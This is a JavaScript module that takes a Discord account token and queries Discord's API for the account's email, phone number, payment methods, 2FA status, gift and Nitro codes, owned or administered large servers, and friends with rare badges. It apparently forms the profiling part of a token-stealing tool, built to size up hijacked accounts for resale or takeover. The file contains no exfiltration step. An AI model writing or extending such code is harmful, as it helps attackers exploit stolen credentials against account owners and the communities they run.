let axios = require("axios");

const request = async (i, x) => {
    try {
        const res = await axios.get(i, { headers: { Authorization: x } });
        return (res.status === 200) ? res.data : "Invalid"
    } catch {
        return "Invalid";
    }
};

const getBadges = (f) => {
    let user = ["<:staff:1090015968618623129> ", "<:partner:918207395279273985> ", "<:events:898186057588277259> ", "<:bughunter_1:874750808426692658> ", "<:bravery:874750808388952075> ", "<:brilliance:874750808338608199> ", "<:balance:874750808267292683> ", "<:early:944071770506416198> ", "<:bughunter_2:874750808430874664> ", "<:activedev:1042545590640324608> ", "<:verifieddeveloper:898181029737680896> "];
    return ((1 & f ? user[0] : "") + (2 & f ? user[1] : "") + (4 & f ? user[2] : "") + (8 & f ? user[3] : "") + (64 & f ? user[4] : "") + (128 & f ? user[5] : "") + (256 & f ? user[6] : "") + (512 & f ? user[7] : "") + (16384 & f ? user[8] : "") + (4194304 & f ? user[9] : "") + (131072 & f ? user[10] : "")) || ":x:"
};

const getGuilds = async (t) => {
    try {
        let r = await request('https://discord.com/api/v9/users/@me/guilds?with_counts=true', t);
        let s = r.filter(s => s.owner || (s.permissions & 8) === 8).filter(s => s.approximate_member_count >= 500).map(s => ({ name: s.name, id: s.id, owner: s.owner, member_count: s.approximate_member_count, member_online: s.approximate_presence_count, avatar: s.icon }));
        return s.length ? s.map(s => { return `${s.owner ? "**👑 Owner**" : "**🛠️ Admin**"} | Server Name: (${s.name}) | Members: \`${s.member_count}\` - Online(s): \`${s.member_online}\`\n[[Get Avatar Link]](https://cdn.discordapp.com/icons/${s.id}/${s.avatar}.png?size=2048)` }).join('\n') : 'Not Found';
    } catch (e) {
        return "";
    }
}

const rareFriendadges = (j) => {
    let user = ["<:staff:1090015968618623129> ", "<:partner:918207395279273985> ", "<:events:898186057588277259> ", "<:bughunter_1:874750808426692658> ", "<:bravery:874750808388952075> ", "<:brilliance:874750808338608199> ", "<:balance:874750808267292683> ", "<:early:944071770506416198> ", "<:bughunter_2:874750808430874664> ", "<:activedev:1042545590640324608> ", "<:verifieddeveloper:898181029737680896> "];
    return ((1 & j ? user[0] : "") + (2 & j ? user[1] : "") + (4 & j ? user[2] : "") + (8 & j ? user[3] : "") + (512 & j ? user[7] : "") + (16384 & j ? user[8] : "") + (4194304 & j ? user[9] : "") + (131072 & j ? user[10] : "")) || "Not Found";
}

const getFriends = async (t) => {
    let ñ = "";
    let r = await request('https://discordapp.com/api/v9/users/@me/relationships', t);
    r.filter((_) => _.type === 1).forEach((n) => {
        const l = rareFriendadges(n.user.public_flags);
        ñ += l !== "Not Found" ? `${l} ${n.user.username}#${n.user.discriminator}\n` : "";
    });
    return ñ || "Not Found";
};

const getLanguage = (i) => {
    let k = { "zh-TW": "🇨🇳 Chinese-Taiwanese", "pr-BR": "🇵🇹 Portuguese", "sv-SE": "🇸🇪 Swedish", "zh-CN": "🇨🇳 Chinese-China", "en-GB": "🪟 English (UK)", "en-US": "🇺🇸 USA", "es-ES": "🇪🇸 Español", "ro": "🇷🇴 Romanian", "fi": "🇫🇮 Finnish", "vi": "🇻🇳 Vietnamese", "tr": "🇹🇷 Turkish", "ru": "🇷🇺 Russian", "uk": "🇺🇦 Ukrainian", "hi": "🇮🇳 Indian", "th": "🇹🇼 Taiwanese", "hr": "🇭🇷 Croatian", "it": "🇮🇹 Italianio", "lt": "🇱🇹 Lithuanian", "no": "🇳🇴 Norwegian", "ja": "🇯🇵 Japanese", "ko": "🇰🇷 Korean", "fr": "🇫🇷 French", "da": "🇩🇰 Dansk", "de": "🇩🇪 Deutsch", "pl": "🇵🇱 Polish", "cs": "🇨🇿 Czech", "el": "🇬🇷 Greek", "bg": "🇧🇬 Bulgarian", "hu": "🇳🇴🇭🇺 Hungarian", };
    return k[i] || "Unknown Language"
};

const getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);

const getNitroPremium = (r) => {
    let boost = ["<:Booster1Month:1087043238654906472> ", "<:Booster2Month:1087043319227494460> ", "<:Booster3Month:1087043368250511512> ", "<:Booster6Month:1087043493236592820> ", "<:Booster9Month:1087043493236592820> ", "<:booster12month:1162420359291732038> ", "<:Booster15Month:1051453775832961034> ", "<:Booster18Month:1051453778127237180> ", "<:Booster24Month:1051453776889917530> "]
    let { premium_type, premium_guild_since } = r, x = "<:nitro:880364932984627231>";
    switch (premium_type) {
        default: return ":x:";
        case 1: return x;
        case 2:
            if (!premium_guild_since) return x;
            const now = new Date();
            const m = [2, 3, 6, 9, 12, 15, 18, 24];
            let rem = 0;
            for (let i = 0; i < m.length; i++) {
                const d = m[i];
                if (Math.round((getDate(new Date(premium_guild_since), d) - now) / 86400000) > 0) {
                    rem = i;
                    break;
                }
            }
            return `${x} ${boost[rem]}`;
    }
}

const getImage = async (p) => !p ? false : `${p}.${(await axios.head(p)).headers['content-type'].includes("image/gif") ? "gif" : "png"}?size=512`;

const getGiftsCodes = async (token, f) => {
    let t = [], r = await request(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${f.locale}`, token);
    return r.length === 0 ? "Codes-Gifts Not Found" : r.forEach((g) => {
        t.push({ name: g.promotion.outbound_title, code: g.code });
    });
};

const getTheme = (t) => {
    var themes = { dark: "Dark", light: "Light" }
    return themes[t] || "Unknown Theme";
}

const getStatusEmoji = (s) => {
    var status = { online: "<:online:1129709364316491787>", idle: "<:idle:1120542710424674306>", dnd: "<:dnd:974692691289993216>", invisible: "<:offline:1137141023529762916>" }
    return status[s];
}


const getDiscordInfo = async (t) => {
    let u = await request(`https://discord.com/api/v9/users/@me`, t);
    if (u === "Invalid") return "THIS TOKEN IS FAKE";
    let s = await request("https://discord.com/api/v9/users/@me/settings", t), r = await request("https://discordapp.com/api/v9/users/@me/relationships", t), g = await request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", t), a = await request("https://discord.com/api/v9/applications", t), c = await request("https://discordapp.com/api/v9/users/@me/connections", t), e = await request("https://discord.com/api/v8/users/@me/entitlements/gifts", t), p = "";
    (await request("https://discord.com/api/v9/users/@me/billing/payment-sources", t))?.forEach(s => p += s.brand && s.invalid === 0 ? "<:paypal:1129073151746252870> " : "", p += s.email ? "<a:card:1083014677430284358> " : "");
    if (t) return {
        token: t,
        ID: u.id,
        globalName: `${u.global_name}`,
        avatarDecoration: `${u.avatar_decoration_data ? u.avatar_decoration_data : "Avatar-Decoration Not Found"}`,
        username: `${u.username}#${u.discriminator}`,
        badges: getBadges(u.flags),
        nitroType: getNitroPremium(await request(`https://discord.com/api/v9/users/${Buffer.from(t.split(".")[0], 'base64').toString('binary')}/profile`, t)),
        avatar: u.avatar ? await getImage(`https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`) : "Avatar Not Found",
        banner: u.banner ? await getImage(`https://cdn.discordapp.com/banners/${u.id}/${u.banner}`) : "Banner Not Found",
        totalFriend: r.filter((b) => b.type === 1).length,
        totalBlocked: r.filter((a) => a.type === 2).length,
        pending: r.filter((r) => r.type === 3).length,
        NitroGifts: e[0] ? e.map((g) => `${g}, `).join("") : "Nitro Gifts-Codes Not Found",
        totalOwnedGuild: g.filter((g) => g.owner).length,
        totalApplication: a.length,
        totalConnection: c.length,
        totalGuild: g.length,
        NSFW: u.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
        MFA2: u.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
        verified: u.verified ? "✅" : "❌",
        bio: u.bio || "Bio Not Found",
        phone: u.phone || "Phone Not Found",
        mail: u.email,
        billing: p ? p : "Not Found",
        langue: getLanguage(s.locale),
        status: getStatusEmoji(s.status),
        theme: getTheme(s.theme),
        gifts: getGiftsCodes(t, s),
        rare: {guilds: (await getGuilds(t)),friends: (await getFriends(t))}
    }
}

module.exports = {
    getDiscordInfo
}
